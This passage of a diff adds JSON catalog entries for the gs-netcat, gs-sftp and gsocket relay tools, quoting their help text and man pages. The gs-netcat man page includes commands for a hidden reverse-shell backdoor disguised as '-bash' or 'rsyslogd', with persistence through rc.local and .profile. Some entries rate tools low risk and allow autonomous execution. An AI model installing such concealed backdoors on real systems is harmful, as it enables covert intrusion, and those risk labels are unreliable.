# Client",
+        "help": "Enter Secret (or press Enter to generate): gsocket-util.c:72:user_secret_from_stdin() ASSERT(len > 0) getline()\n Exiting...",
+        "man": "GS-NETCAT(1)                 General Commands Manual               GS-NETCAT(1)\n\nNAME\n     gs-netcat  -- transfer data, forward traffic and execute commands on a re-\n     mote host. Securely.\n\nSYNOPSIS\n     gs-netcat [-rlgvqwCTSDiu] [-s secret] [-k keyfile] [-L logfile] [-d IP]\n               [-p port] [-e cmd]\n\nDESCRIPTION\n     The gs-netcat utility is a re-implementation of netcat. It allows  two  or\n     more  users to establish a secure TCP connection with each other in a sce-\n     nario where all users are behind NAT/Firewall and would  not  be  able  to\n     connect  to  each other directly. Typically a connection between one work-\n     station and another workstation on a different Local Area Network.\n\n     It uses the Global Socket Relay Network (GSRN) instead of direct TCP  con-\n     nections.  Neither  workstation  needs to open a port in their firewall or\n     accept incoming TCP connections.\n\n     The connection is end-2-end encrypted using SRP (RFC  5054)  with  AES-256\n     and a 4096 Prime. The GSRN sees only the encrypted traffic.\n\n     Common uses include:\n\n           *   simple TCP proxies\n           *   PTY shell\n           *   File transfer\n           *   a SOCKS ProxyCommand for ssh(1)\n           *   and much, much more.\n\nOPTIONS\n     -C      Disable encryption and use clear-text instead. Use with caution.\n\n     -d ip   Destination IPv4 address for port forwarding.\n\n     -D      Daemon  &  Watchdog  mode. Start gs-netcat as a background process\n             and restart if killed.\n\n     -e cmd  Execute command and send output to the connected client. Needs -l.\n\n     -g      Generate a secure random password and output it to  standard  out-\n             put.\n\n     -i      Interactive login shell. The server spawns a true PTY login shell.\n             The  client  acts  as a true PTY client (with Ctrl-C etc working).\n             The client can terminate the session by typing 'Ctrl-e q'  at  any\n             time  or by typing 'exit'. The server supports multiple clients at\n             the same time.\n\n     -k file\n             A file containing the password.\n\n     -l      Server/Listening mode. The default mode is client.\n\n     -L file\n             Log file [default: standard out]\n\n     -p port\n             Port to listen on or to forward traffic to [1-65535].\n\n     -q      Quiet mode. Do not output any warnings or errors.\n\n     -r      Receive-only. Do not send any data. Terminate when no more data is\n             available for reading.\n\n     -s secret\n             A password chosen by the user. Both users need  to  use  the  same\n             password to connect.\n\n     -S      Act  as  a  SOCKS4/4a/5  server.  The server acts as a SOCKS4/4a/5\n             proxy. It allows multiple gs-netcat clients  to  (securely)  relay\n             traffic via the server. Needs -l.\n\n     -T      Use TOR. The gs-netcat tool will connect via TOR to the GSRN. This\n             requires  TOR  to be installed and running. The IP and PORT of the\n             TOR server can be set using environment variables.\n\n     -t      Connect to the GSRN (only) and check if the peer is listening.  Do\n             not connect the peer.\n\n     -u      Use UDP instead of TCP for port forwarding. Needs -p.\n\n     -v      Prints  status messages. Use -vv to be more verbose and -vvv to be\n             insanely verbose.\n\n     -w      Client to wait for the listening server to become available.\n\nCONSOLE\n     The interactive login shell ( -i ) has a command console. Pressing 'Ctrl-e\n     c' (e for EEEElite) opens the command console. The  command  console  dis-\n     plays the following information:\n\n           *   Latency (in milliseconds) to the remote host\n           *   Warning when a user logs into the system or becomes active\n           *   Data throughput\n           *   File transfer logs\n     Type 'help' for a list of available commands.\n\nFILETRANSFER\n     File transfer is available from the command console. Files are transferred\n     with the permission and modification timestamp unchanged. Partially trans-\n     ferred  files  are  re-started where the transfer was left off.  The 'put'\n     command is used for uploading:\n           put foobar.txt\n           put $HOME/foobar.txt\n           put /tmp/*.log\n           put $(find. -type f -name '*.c')\n     (The above example shows Shell Variable substitution and  word  expansion)\n     It is possible to limit the amount of path information that is sent as im-\n     plied  directories  for  each path you specify. You can insert a dot and a\n     slash into the source path, like this:\n           put /foo/./bar/baz.c\n     That would create /tmp/bar/baz.c on the remote machine.  The 'get' command\n     is used for downloading:\n           get foobar.txt\n           get $(find /var/./ -name '*.log')\n     Transferring a directory automatically transfers all files and directories\n     within that directory (recursively):\n           get /var/log\n           get /\n     The first command transfers all directories and files in  /var/log/*.  The\n     latter command transfers the entire filesystem.  Multiple get/put commands\n     can be scheduled at the same time.\n\nEXAMPLES\n     Example 1 - Listen for a new connection using the password 'MySecret':\n           $ gs-netcat -s MySecret -l\n\n     Connect with client using the same password:\n           $ gs-netcat -s MySecret\n\n     Example 2 - spawn a PTY login shell when a client connects:\n           $ gs-netcat -s MySecret -l -i\n\n     Log in to server's interactive shell:\n           $ gs-netcat -s MySecret -i\n\n     Log in via TOR:\n           $ gs-netcat -s MySecret -i -T\n\n     Log in via a Socks5 Proxy:\n           $ export GSOCKET_SOCKS_IP=127.0.0.1\n           $ export GSOCKET_SOCKS_PORT=1080\n           $ gs-netcat -s MySecret -i -T\n\n     Example 3 - Execute a command when a client connects:\n           $ gs-netcat -s MySecret -l -e 'echo hello world; id; exit'\n\n     Connect client to the server:\n           $ gs-netcat -s MySecret\n\n     Example 4 - Pipe data from client to server:\n           $ gs-netcat -s MySecret -l -r >warez.tar.gz\n\n     Client to read 'warez.tar.gz' and pipe it to the server.\n           $ gs-netcat -s MySecret <warez.tar.gz\n\n     Example 5 - Server to act as a SOCKS4/4a/5 server:\n           $ gs-netcat -s MySecret -l -S\n\n     Client  to  listen  on TCP port 1080 and forward any new connection to the\n     server's SOCKS server:\n           $ gs-netcat -s MySecret -p 1080\n\n     Example 6 - TCP Port Forward all connections to 192.168.6.7:22. Server:\n           $ gs-netcat -s MySecret -l -d 192.168.6.7 -p 22\n\n     Client to listen on TCP port 2222 and forward any new  connection  to  the\n     the server. The server then forwards the connection to 192.168.6.7:22.\n           $ gs-netcat -s MySecret -p 2222\n           $ ssh -p 2222 root@127.0.0.1\n\n     The same using 1 command:\n           $ ssh -o ProxyCommand='gs-netcat -s MySecret' root@ignored\n\n     Example 7 - Creating an SFTP server using gs-netcat:\n           $ gs-netcat -s MySecret -l -e /usr/lib/sftp-server\n\n     The  sftp-server binary speaks the sftp-protocol to stdin/stdout. The sftp\n     binary also speaks sftp-protocol to stdin/stdout. The tool can be used  to\n     connect  both  via  GSRN (encrypted) and access the SFTP server running on\n     the server's side from the client via the GSRN (encrypted).:\n           $ export GSOCKET_ARGS='-s MySecret'\n           $ sftp -D gs-netcat\n\n     Example 8 - Encrypted Reverse PTY shell hidden as '-bash' in  the  process\n     list - also known as 'backdoor':\n           $ (GSOCKET_ARGS=\"-s MySecret -liqD\" exec -a -bash gs-netcat)\n\n     The  following line in /etc/rc.local starts the backdoor after each system\n     reboot:\n           GSOCKET_ARGS=\"-s  MySecret  -liqD\"  HOME=/root   TERM=xterm-256color\n           SHELL=\"/bin/bash\"   /bin/bash   -c \"cd   $HOME;   exec  -a  rsyslogd\n           /usr/local/bin/gs-netcat\"\n\n     The following line in /etc/rc.local starts a port-forward to 127.0.0.1:22:\n           GSOCKET_ARGS=\"-k MySecret2 -lqD -d 127.1 -p22\" /bin/bash -c \"exec -a\n           rsyslogd /usr/local/bin/gs-netcat\"\n\n     The following line in the user's ~/.profile  starts  the  backdoor  (once)\n     when the user logs in. All in one line:\n           killall  -0  gs-netcat  2>/dev/null  ||  (GSOCKET_ARGS=\"-s MySecret3\n           -liqD\" SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)\n\n     The '(...)' brackets start a sub-shell which is then  replaced  (by  exec)\n     with  the  gs-netcat  process.  The  process is hidden (as -bash) from the\n     process list.\n\n     Client to connect to the backdoor:\n           $ gs-netcat -s MySecret -i\n\nENVIRONMENT\n     The following environment variables can be set to control the behavior  of\n     gs-netcat\n\n     GSOCKET_SOCKS_IP\n           Specify  the  IP  address  of  the  TOR  server  (or any other SOCKS\n           server). Use together with -T. Default is 127.0.0.1.\n\n     GSOCKET_SOCKS_PORT\n           The port number of the TOR server (or any other SOCKS  server).  Use\n           together with -T. Default is 9050.\n\n     GSOCKET_ARGS\n           A  string  containing  additional command line parameters. First the\n           normal command line parameters are processed and  then  the  command\n           line parameters from GSOCKET_ARGS.\n\nSECURITY\n     Passing the password as command line parameter is not secure. Consider us-\n     ing the -k option or GSOCKET_ARGS or enter the password when prompted:\n\n           $ gs-netcat -k <file>\n\n           $ export GSOCKET_ARGS=\"-s MySecret\"\n           $ gs-netcat\n\n     1. The security is end-2-end. This means from User-2-User (and not just to\n     the GSRN). The GSRN relays only (encrypted) data to and from the users.\n\n     2. The session is 256 bit and ephemeral. It is freshly generated for every\n     session and generated randomly (and is not based on the password). It uses\n     OpenSSL's SRP with AES-256 and a 4096 Prime.\n\n     3.  The  password can be 'weak' without weakening the security of the ses-\n     sion. A brute force attack against a weak password requires a new TCP con-\n     nection for every guess.\n\n     4. Do not use stupid passwords like 'password123'. Malice might  pick  the\n     same (stupid) password by chance and connect. If in doubt use gs-netcat -g\n     to  generate  a  strong one. Alice's and Bob's password should at least be\n     strong enough so that Malice can not guess it by  chance  while  Alice  is\n     waiting for Bob to connect.\n\n     5.  If  Alice shares the same password with Bob and Charlie and either one\n     of them connects then Alice can not tell if it is Bob or Charlie who  con-\n     nected.\n\n     6.  Assume  Alice shares the same password with Bob and Malice. When Alice\n     stops listening for a connection then Malice could start to listen for the\n     connection instead. Bob (when opening a new connection) can not tell if he\n     is connecting to Alice or to Malice. Use -a <token>  if  you  worry  about\n     this.  TL;DR:  When  sharing  the same password with a group larger than 2\n     then it is assumed that everyone in that group plays nicely. Otherwise use\n     SSH over the GS/TLS connection.\n\n     7. SRP has Perfect Forward Secrecy. This means that past sessions can  not\n     be decrypted even if the password becomes known.\n\nNOTES\n     The   latest   version   is   available   from  https://github.com/hacker-\n     schoice/gsocket/.\n\nSEE ALSO\n     gsocket(1), gs-sftp(1), gs-mount(1), blitz(1), nc(1), socat(1)\n\nBUGS\n     Efforts have been made to have gs-netcat \"do the right thing\" in  all  its\n     various modes. If you believe that it is doing the wrong thing under what-\n     ever  circumstances, please notify me (skyper@thc.org) and tell me how you\n     think it should behave.\n\nDebian                          October 08, 2020                   GS-NETCAT(1)",
+        "apropos": "gs-netcat (1)        - transfer data, forward traffic and execute commands on..."
+      },
+      "binary_metadata": {
+        "path": "/usr/bin/gs-netcat",
+        "size_bytes": 158000,
+        "is_symlink": false,
+        "file_type": "ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=49cd96484d821fe1849d5fb0ee7e1ba41932c523, for GNU/Linux 3.2.0, stripped"
+      }
+    },
+    {
+      "name": "gs-sftp",
+      "description": "Secure File Transfer Protocol via Global Socket.",
+      "usage": null,
+      "arguments": [
+        {
+          "flags": [
+            "-l"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Server Mode.",
+          "default": "mode is client",
+          "choices": null,
+          "raw": "  -l           Server Mode."
+        },
+        {
+          "flags": [
+            "-R"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Server in read-only mode.",
+          "default": null,
+          "choices": null,
+          "raw": "  -R           Server in read-only mode."
+        },
+        {
+          "flags": [
+            "-s"
+          ],
+          "metavar": "secret",
+          "takes_value": true,
+          "description": "Secret (e.g. password).",
+          "default": null,
+          "choices": null,
+          "raw": "  -s <secret>  Secret (e.g. password)."
+        },
+        {
+          "flags": [
+            "-k"
+          ],
+          "metavar": "file",
+          "takes_value": true,
+          "description": "Read Secret from file.",
+          "default": null,
+          "choices": null,
+          "raw": "  -k <file>    Read Secret from file."
+        },
+        {
+          "flags": [
+            "-T"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Use  TOR.  The gs-sftp tool will connect via TOR to the GSRN. This",
+          "default": null,
+          "choices": null,
+          "raw": "     -T      Use  TOR.  The gs-sftp tool will connect via TOR to the GSRN. This"
+        }
+      ],
+      "raw_help": "root@kali:~# gs-sftp -h\n gs-sftp [-k file] [-s password] [-l]\n \n  -l           Server Mode.\n  -R           Server in read-only mode.\n  -s <secret>  Secret (e.g. password).\n  -k <file>    Read Secret from file.\n\n Example:\n   $ gs-sftp -s MySecret -l             # Server\n   $ gs-sftp -s MySecret                # Client\n \n See 'gs-netcat -h' for more options.",
+      "examples": [
+        {
+          "status": "operational_example",
+          "command": "$ gs-sftp -s MySecret -l",
+          "template": null,
+          "original_sha256": "dec0d161e9919d05227804229dd2663e21cce27ba9183c457b224e142b97175a"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ gs-sftp -s MySecret",
+          "template": null,
+          "original_sha256": "28a1a0da779e5de4e1fbbb4683036d5af4bc2f477b16faee39fd3e791a192d11"
+        },
+        {
+          "status": "operational_example",
+          "command": "gs-sftp [-k file] [-s password] [-l]",
+          "template": null,
+          "original_sha256": "8d4bfa4327dbbc7440d3766a97a8871e530f536a8ec8310ccbdf730d4d0cf259"
+        }
+      ],
+      "risk": {
+        "level": "low",
+        "signals": [],
+        "requires_explicit_authorization": false,
+        "allow_autonomous_execution": true,
+        "examples_policy": "operational"
+      },
+      "local_help": {
+        "--help": "gs-sftp [-k file] [-s password] [-l]\n\n   -l           Server Mode.\n   -R           Server in read-only mode.\n   -s <secret>  Secret (e.g. password).\n   -k <file>    Read Secret from file.\n \nExample:\n    $ gs-sftp -s MySecret -l             # Server\n    $ gs-sftp -s MySecret                # Client\n\nSee 'gs-netcat -h' for more options.",
+        "-h": "gs-sftp [-k file] [-s password] [-l]\n\n   -l           Server Mode.\n   -R           Server in read-only mode.\n   -s <secret>  Secret (e.g. password).\n   -k <file>    Read Secret from file.\n \nExample:\n    $ gs-sftp -s MySecret -l             # Server\n    $ gs-sftp -s MySecret                # Client\n\nSee 'gs-netcat -h' for more options.",
+        "help": "Enter Secret (or press Enter to generate): =Encryption     : SRP-AES-256-CBC-SHA-End2End (Prime: 4096 bits)\n\nConnection closed.  \nConnection closed",
+        "man": "GS-SFTP(1)                   General Commands Manual                 GS-SFTP(1)\n\nNAME\n     gs-sftp -- Secure File Transfer Protocol via Global Socket.\n\nSYNOPSIS\n     gs-sftp [-lTR] [-s secret] [-k keyfile]\n\nDESCRIPTION\n     The gs-sftp utility is a wrapper script for gs-netcat. It allows two users\n     to  establish  a secure SFTP connetion via the Global Socket Relay Network\n     (GSRN). This is useful in a scenario where both users are behind NAT/Fire-\n     wall and unable to connect to each other directly.\n\nOPTIONS\n     -s secret\n             A password chosen by the user. Both users need  to  use  the  same\n             password to connect.\n\n     -k FILE\n             A file containing the password.\n\n     -l      Server mode. The default mode is client.\n\n     -R      Places  server  (-l) into a read-only mode. Attempts to open files\n             for writing, as well as other operations that change the state  of\n             the filesystem, will be denied.\n\n     -T      Use  TOR.  The gs-sftp tool will connect via TOR to the GSRN. This\n             requires TOR to be installed and running. The IP and PORT  of  the\n             TOR server can be set using environment variables.\n\n     See gs-netcat(1) for more options.\n\nEXAMPLES\n     Example 1 - SFTP Server listening for clients using password 'MySecret':\n           $ gs-sftp -s MySecret -l\n\n     Connect sftp-client using the same password:\n           $ gs-sftp -s MySecret\n\nENVIRONMENT\n     See gs-netcat(1) for a list of supported environment variables.\n\nSEE ALSO\n     gsocket(1), gs-netcat(1), sftp(1)\n\nBUGS\n     Efforts  have  been  made  to have gs-sftp \"do the right thing\" in all its\n     various modes. If you believe that it is doing the wrong thing under what-\n     ever circumstances, please notify me (skyper@thc.org) and tell me how  you\n     think it should behave.\n\nDebian                          October 12, 2020                     GS-SFTP(1)",
+        "apropos": "gs-sftp (1)          - Secure File Transfer Protocol via Global Socket."
+      },
+      "binary_metadata": {
+        "path": "/usr/bin/gs-sftp",
+        "size_bytes": 1679,
+        "is_symlink": false,
+        "file_type": "Bourne-Again shell script, ASCII text executable, with very long lines (384)"
+      }
+    },
+    {
+      "name": "gsocket",
+      "description": "Connect like there is no firewall. Securely.",
+      "usage": null,
+      "arguments": [
+        {
+          "flags": [
+            "-s"
+          ],
+          "metavar": "secret",
+          "takes_value": true,
+          "description": "Secret (e.g. password).",
+          "default": null,
+          "choices": null,
+          "raw": "  -s <secret>  Secret (e.g. password)."
+        },
+        {
+          "flags": [
+            "-k"
+          ],
+          "metavar": "file",
+          "takes_value": true,
+          "description": "Read Secret from file.",
+          "default": null,
+          "choices": null,
+          "raw": "  -k <file>    Read Secret from file."
+        },
+        {
+          "flags": [
+            "-p"
+          ],
+          "metavar": "ports",
+          "takes_value": true,
+          "description": "Range of listening ports to redirect [default=all]",
+          "default": "all]",
+          "choices": null,
+          "raw": "  -p <ports>   Range of listening ports to redirect [default=all]"
+        },
+        {
+          "flags": [
+            "-T"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Use TOR.",
+          "default": null,
+          "choices": null,
+          "raw": "  -T           Use TOR."
+        },
+        {
+          "flags": [
+            "-g"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Generate a secure random secret and output it to standard output.",
+          "default": null,
+          "choices": null,
+          "raw": "     -g      Generate a secure random secret and output it to standard output."
+        },
+        {
+          "flags": [
+            "-q"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Quiet mode. Do not output any warnings or errors.",
+          "default": null,
+          "choices": null,
+          "raw": "     -q      Quiet mode. Do not output any warnings or errors."
+        },
+        {
+          "flags": [
+            "--ifconfig"
+          ],
+          "metavar": "10.9.8.1 10.9.8.2",
+          "takes_value": true,
+          "description": "",
+          "default": null,
+          "choices": null,
+          "raw": "           --ifconfig 10.9.8.1 10.9.8.2"
+        },
+        {
+          "flags": [
+            "--ifconfig",
+            "--remote"
+          ],
+          "metavar": "10.9.8.2 10.9.8.1 gsocket",
+          "takes_value": true,
+          "description": "",
+          "default": null,
+          "choices": null,
+          "raw": "           --ifconfig 10.9.8.2 10.9.8.1 --remote gsocket"
+        }
+      ],
+      "raw_help": "root@kali:~# gsocket -h\n gsocket [-k file] [-s password] <programm> <parameters>\n  -s <secret>  Secret (e.g. password).\n  -k <file>    Read Secret from file.\n  -p <ports>   Range of listening ports to redirect [default=all]\n  -T           Use TOR.\n \n Example:\n   $ gsocket -s MySecret /usr/bin/sshd -d         # Server\n   $ gsocket -s MySecret ssh root@gsocket         # Client\n \n See 'gs-netcat -h' for more options.",
+      "examples": [
+        {
+          "status": "operational_example",
+          "command": "$ gsocket -s MySecret /usr/sbin/sshd\nClient:\n$ gsocket -s MySecret ssh xaitax@gsocket",
+          "template": null,
+          "original_sha256": "1d497374fbefc1db6a999f0a41c5b1102a130567ef624976f1872f0e236d80c6"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ gsocket -s MySecret nc -lp 31337\nClient:\n$ gsocket -s MySecret nc gsocket 31337",
+          "template": null,
+          "original_sha256": "a542f1c3a75b841ac9afdf4789352fdd674f9908d1b591c583f6f6f4b6463fa5"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ gsocket -s MySecret inspircd --nolog --nofork\nClient:\n$ gsocket -s MySecret irssi -c gsocket",
+          "template": null,
+          "original_sha256": "bd8db454070e7b94042fdcc9bce036152ab112909b5ddb7ae92a0e42115dbb6b"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ gsocket -s MySecret socat - TCP_LISTEN:31337\nClient:\n$ gsocket -s MySecret socat - TCP:gsocket:31337",
+          "template": null,
+          "original_sha256": "97845bf77583fc11e1a2d552156e0b36a3d2d0ca7ea4954db10ae5946bf28945"
+        },
+        {
+          "status": "operational_example",
+          "command": "gsocket [-k file] [-s password] <programm> <parameters>",
+          "template": null,
+          "original_sha256": "6bba1cfdf56ea1b329de94d5aa8415fe5d7c02f6288a061835d48f9bc70b29af"
+        },
+        {
+          "status": "operational_example",
+          "command": "gsocket: Enter Secret (or press Enter to generate): gsocket: =Encryption     : SRP-AES-256-CBC-SHA-End2End (Prime: 4096 bits)",
+          "template": null,
+          "original_sha256": "12fb4bba7bb06fd3f5e6a0b6f0119cf4137aed8bfc0b6a575865705ffa3deb73"
+        }
+      ],
+      "risk": {
+        "level": "low",
+        "signals": [],
+        "requires_explicit_authorization": false,
+        "allow_autonomous_execution": true,
+        "examples_policy": "operational"
+      },
+      "local_help": {
+        "--help": "gsocket [-k file] [-s password] <programm> <parameters>\n   -s <secret>  Secret (e.g. password).\n   -k <file>    Read Secret from file.\n   -p <ports>   Range of listening ports to redirect [default=all]\n   -T           Use TOR.\n\nExample:\n    $ gsocket -s MySecret /usr/bin/sshd -d         # Server\n    $ gsocket -s MySecret ssh root@gsocket         # Client\n\nSee 'gs-netcat -h' for more options.",
+        "-h": "gsocket [-k file] [-s password] <programm> <parameters>\n   -s <secret>  Secret (e.g. password).\n   -k <file>    Read Secret from file.\n   -p <ports>   Range of listening ports to redirect [default=all]\n   -T           Use TOR.\n\nExample:\n    $ gsocket -s MySecret /usr/bin/sshd -d         # Server\n    $ gsocket -s MySecret ssh root@gsocket         # Client\n\nSee 'gs-netcat -h' for more options.",
+        "help": "gsocket: Enter Secret (or press Enter to generate): gsocket: =Encryption     : SRP-AES-256-CBC-SHA-End2End (Prime: 4096 bits)\n/usr/bin/gsocket: line 133: exec: help: not found",
+        "man": "gsocket(1)                   General Commands Manual                 gsocket(1)\n\nNAME\n     gsocket -- connect like there is no firewall. Securely.\n\nSYNOPSIS\n     gsocket [-qT] [-s secret] [-k keyfile] [-p port] [program] [args ...]\n\nDESCRIPTION\n     The  gsocket tool can be used to enable a program to communicate through a\n     firewall in situations where it would not be possible to establish  a  di-\n     rect  connection to another host/workstation (NATed/firewalled). The typi-\n     cal scenario is two workstations that are on separate private networks and\n     behind separate firewalls. The gsocket tool hijacks  the  network  library\n     functions (such as connect() and accept()) of the program and encrypts and\n     redirects the traffic through the Global Socket Relay Network (GSRN).\n\n     Neither  workstation needs to open a port in their firewall nor accept in-\n     coming TCP connections.\n\n     The connection is end-2-end encrypted using SRP (RFC  5054)  with  AES-256\n     and a 4096 Prime. The GSRN sees only the encrypted traffic.\n\n     Common uses include:\n\n           *   ssh from one workstation to another\n           *   OpenVPN between two workstations\n           *   netcat between two workstations\n           *   and much, much more.\n\n      ...while both workstations are behind NAT and firewalled.\n\n     Abandon  the thought of IP addresses and port numbers: Two programs should\n     be able to communicate with each other as long as they know the  same  se-\n     cret  (rather  than  each other's IP address and port number). The gsocket\n     tools establishes such a connection regardless and independent of the  lo-\n     cal  IP address or geographical location. It does so by analyzing the pro-\n     gram and replacing the IP Layer with its own transport through  GSRN.  The\n     connection  is end-2-end encrypted. The GSRN sees only the encrypted traf-\n     fic.\n\n     The typical scenario is a client/server arrangement such as ssh and  sshd:\n     Connections  by  ssh  to  any hostname ending in '.gsocket' are redirected\n     (through the GSRN) to the (firewalled) sshd server.\n\n     The redirection is done per program (and limited to  that  program  only).\n     The gsocket tool does not change the routing table and does not change the\n     NAT  nor  the  firewall settings. It does not require superuser privileges\n     either.\n\nOPTIONS\n     -s secret\n             A secret chosen by the user. Both ends need to use the same secret\n             to connect.\n\n     -k file\n             A file containing the secret.\n\n     -g      Generate a secure random secret and output it to standard output.\n\n     -q      Quiet mode. Do not output any warnings or errors.\n\n     -T      Use TOR. The gsocket tool will connect through TOR  to  the  GSRN.\n             This requires TOR to be installed and running.\n\n     -p port\n             TCP port range of listening ports to redirect [default=all].\n\n     Connections  to  any  hostname  ending in '*.gsocket' or to the IP Address\n     '127.31.33.7' are redirected through the GSRN.\n\n     Connections to any hostname  ending  in  '*.thc'  or  to  the  IP  Address\n     '127.31.33.8' are first redirected through TOR and then through the GSRN.\n\nEXAMPLES\n     Example 1 - OpenSSH between two firewalled workstations:\n\n     Server:\n           $ gsocket -s MySecret /usr/sbin/sshd\n     Client:\n           $ gsocket -s MySecret ssh xaitax@gsocket\n\n     Example 2 - netcat between two firewalled workstations:\n\n     Server:\n           $ gsocket -s MySecret nc -lp 31337\n     Client:\n           $ gsocket -s MySecret nc gsocket 31337\n\n     Example 3 - OpenVPN between two firewalled workstations:\n\n     Server:\n           $   gsocket  -s  MySecret  openvpn  --dev  tun1  --proto  tcp-server\n           --ifconfig 10.9.8.1 10.9.8.2\n     Client:\n           $  gsocket  -s  MySecret  openvpn  --dev  tun1  --proto   tcp-client\n           --ifconfig 10.9.8.2 10.9.8.1 --remote gsocket\n\n     Example 4 - IRCD between two firewalled workstations:\n\n     Server:\n           $ gsocket -s MySecret inspircd --nolog --nofork\n     Client:\n           $ gsocket -s MySecret irssi -c gsocket\n\n     Example 5 - Socat between two firewalled workstations:\n\n     Server:\n           $ gsocket -s MySecret socat - TCP_LISTEN:31337\n     Client:\n           $ gsocket -s MySecret socat - TCP:gsocket:31337\n\nSYSTEMCTL INSTALLATION\n     It is possible to make any service/daemon accessible through any firewall.\n     The service is then only acessible through the GSRN and only if the client\n     knows the secret. No port or service is exposed to the public Internet and\n     the  existence  of the service remains hidden. This example makes openssh-\n     server (sshd) accessible through the GSRN. Nobody, not even the GSRN oper-\n     ators, have access to the port, daemon or service (they do  not  know  the\n     secret).  The  new  service  coexists with the existing openssh-server and\n     does not interfere with the existing openssh-server.\n\n     1. Copy /etc/systemd/system/sshd to /etc/systemd/system/gs-sshd\n\n     2. Edit /etc/systemd/system/gs-sshd and change this line:\n           ExecStart=/usr/sbin/sshd -D $SSHD_OPTS\n     to\n           ExecStart=gsocket -s MySecret /usr/sbin/sshd -D $SSHD_OPTS\n\n     3. Start the newly created service\n           # systemctl start gs-sshd\n\n     4. Check the status\n           # systemctl status gs-sshd\n\n     5. Connect from any other host to  the  newly  created  (hidden)  openssh-\n     server:\n           $ gsocket -s MySecret ssh user@gsocket\n\nTESTING\n     The  gsocket  tool uses the LD_PRELOAD method to hijack network calls from\n     the calling process. It then concatenates the port number  to  the  secret\n     and  spwans  a  gs-netcat process to forward the TCP connection. The setup\n     can be tested with gs-netcat.\n\n     Test 1 - gsocket server and gs-netcat client:\n\n     Server:\n           $ gsocket -s MySecret nc -lp 1234 # TCP port is 1234\n     Client:\n           $ gs-netcat -s 1234-MySecret # Notice `<port>-<SECRET>`\n\n     Test 2 - gsocket client and gs-netcat server:\n\n     Server:\n           $ gs-netcat -s 1234-MySecret -l\n     Client:\n           $ gsocket -s MySecret nc blah.gsocket 1234\n\n     Internally the gsocket tool (on the client side) forks  a  background  gs-\n     netcat  process listening on 127.31.33.7 on a random TCP port. The gsocket\n     tool then detects  `nc`  trying  to  resolve  `blah.gsocket`  and  returns\n     127.31.33.7 to `nc`. The `nc` process then connects to 127.31.33.7 instead\n     and  the gs-netcat process (that got started automatically) takes the con-\n     nection and forwards the traffic via the GSRN. The `nc` tool can also  di-\n     rectly connect to 127.31.33.7 instead of blah.gsocket (for testing):\n\n     Client:\n           $ gsocket -s MySecret nc -n 127.31.33.7 1234\n\n     Test 3 - SSHD via gsocket:\n\n     Server:\n           $ gsocket -s MySecret /usr/sbin/sshd -D -p 1234\n     Client:\n           $ gs-netcat -s 1234-MySecret\n           SSH-2.0-OpenSSH_8.4p1 Debian-2\n\n     Use gs-netcat as a port-forwarder and ssh to connect:\n\n     Client:\n           $ gs-netcat -s 1234-MySecret -p 44222\n           $ ssh -p 44222 user@127.1\n\n     Test 4 - SSH via gsocket:\n\n     On the server start a gs-netcat port forward to forward incoming GSRN con-\n     nections to the SSHD on localhost:\n\n     Server:\n           $ gs-netcat -s 22-MySecret -l -d 127.0.0.1 -p 22\n     Client:\n           $ gsocket -s MySecret ssh user@gsocket\n\nENVIRONMENT\n     The  following environment variables can be set to control the behavior of\n     gsocket\n\n     GSOCKET_SOCKS_IP\n           Specify the IP address  of  the  TOR  server  (or  any  other  SOCKS\n           server). Use together with -T. Default is 127.0.0.1.\n\n     GSOCKET_SOCKS_PORT\n           The  port  number of the TOR server (or any other SOCKS server). Use\n           together with -T. Default is 9050.\n\n     GSOCKET_ARGS\n           A string containing additional command line  parameters.  First  the\n           normal  command  line  parameters are processed and then the command\n           line parameters from GSOCKET_ARGS.\n\nSECURITY\n     Passing the password as command line parameter is not secure. Consider us-\n     ing the -k option or GSOCKET_ARGS or enter the password when prompted:\n\n           $ gsocket -k <file>\n\n           $ export GSOCKET_ARGS=\"-s MySecret\"\n           $ gsocket\n\n     1. The security is end-2-end. This means from user-2-user (and not just to\n     the GSRN). The GSRN relays only (encrypted) data to and from the users.\n\n     2. The session is 256 bit and ephemeral. It is freshly generated for every\n     session and generated randomly (and is not based on the password). It uses\n     OpenSSL's SRP with AES-256 and a 4096 Prime.\n\n     3. The password can be 'weak' without weakening the security of  the  ses-\n     sion. A brute force attack against a weak password requires a new TCP con-\n     nection for every guess.\n\n     4.  Do  not use stupid passwords like 'password123'. Malice might pick the\n     same (stupid) password by chance and connect. If in doubt use gs-netcat -g\n     to generate a strong one. Alice's and Bob's password should  at  least  be\n     strong  enough  so  that  Malice can not guess it by chance while Alice is\n     waiting for Bob to connect.\n\n     5. If Alice shares the same password with Bob and Charlie and  either  one\n     of  them connects then Alice can not tell if it is Bob or Charlie who con-\n     nected.\n\n     6. Assume Alice shares the same password with Bob and Malice.  When  Alice\n     stops listening for a connection then Malice could start to listen for the\n     connection instead. Bob (when opening a new connection) can not tell if he\n     is  connecting  to  Alice  or to Malice. Use -a <token> if you worry about\n     this. TL;DR: When sharing the same password with a  group  larger  than  2\n     then it is assumed that everyone in that group plays nicely. Otherwise use\n     SSH over the GS/TLS connection.\n\n     7.  SRP has Perfect Forward Secrecy. This means that past sessions can not\n     be decrypted even if the password becomes known.\n\nNOTES\n     The  latest   version   is   available   from   https://github.com/hacker-\n     schoice/gsocket/.\n\nSEE ALSO\n     gs-netcat(1), gs-sftp(1), gs-mount(1), blitz(1), nc(1), socat(1)\n\nBUGS\n     Efforts  have  been  made  to have gsocket \"do the right thing\" in all its\n     various modes. If you believe that it is doing the wrong thing under what-\n     ever circumstances, please notify me (skyper@thc.org) and tell me how  you\n     think it should behave.\n\nDebian                           March 02, 2021                      gsocket(1)",
+        "apropos": "gsocket (1)          - connect like there is no firewall. Securely."
+      },
+      "binary_metadata": {
+        "path": "/usr/bin/gsocket",
+        "size_bytes": 5381,
+        "is_symlink": false,
